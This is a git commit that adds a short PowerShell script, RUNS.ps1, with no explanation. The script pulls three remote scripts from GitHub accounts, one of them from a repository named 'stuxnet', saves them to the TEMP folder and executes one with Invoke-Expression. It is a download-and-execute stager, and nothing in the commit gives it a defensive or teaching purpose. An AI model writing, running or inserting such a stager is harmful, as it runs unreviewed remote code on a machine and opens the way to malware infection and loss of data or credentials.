7cbcbc82b3a3d9116f71dc010ae244d033f09c7c
Gaxi261 <127938084+Gaxi261@users.noreply.github.com>
2025-03-21 14:26:10 +1100

    Create RUNS.ps1

---
+++ RUNS.ps1
@@ -0,0 +1,10 @@
+$url1 = "https://raw.githubusercontent.com/Gaxi261/stuxnet/refs/heads/main/Chrome.ps1"
+$output1 = "$env:TEMP\p.ps1"
+Invoke-WebRequest -Uri $url1 -OutFile $output1
+$url2 = "https://raw.githubusercontent.com/cia168168/folder/main/stop.ps1"
+$output2 = "$env:TEMP\stop.ps1"
+Invoke-WebRequest -Uri $url2 -OutFile $output2
+$url3 = "https://raw.githubusercontent.com/cia168168/folder/main/BAT.ps1"
+$output3 = "$env:TEMP\BAT.ps1"
+Invoke-WebRequest -Uri $url3 -OutFile $output3
+IEX ((New-Object Net.WebClient).DownloadString($output3))
